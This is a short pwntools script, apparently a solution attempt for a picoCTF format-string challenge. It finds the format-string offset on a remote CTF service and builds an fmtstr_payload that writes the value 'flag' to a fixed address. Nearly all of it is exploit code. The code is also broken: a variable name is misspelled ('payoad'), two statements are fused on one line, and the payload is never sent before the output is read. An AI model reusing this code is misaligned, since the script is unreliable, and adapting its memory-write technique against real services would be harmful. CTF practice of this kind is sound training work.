from pwn import *

context.binary = ELF('./vuln')

p = remote('rhea.picoctf.net', 53865)

# Function to send payload to target
def exec_fmt(payload): 
	p = remote('rhea.picoctf.net', 53865)
	p.sendline(payoad)
	return p.recvall()

autofmt = FmtStr(exec_fmt) # Create exploit automater
offset = autofmt.offset

# Key-value pairs for addresses and their final value after exploit
writes = {
	0x404060: 0x67616c66
}payload = fmtstr_payload(offset, writes)

flag = p.recvall()

print(flag)
print(payload)
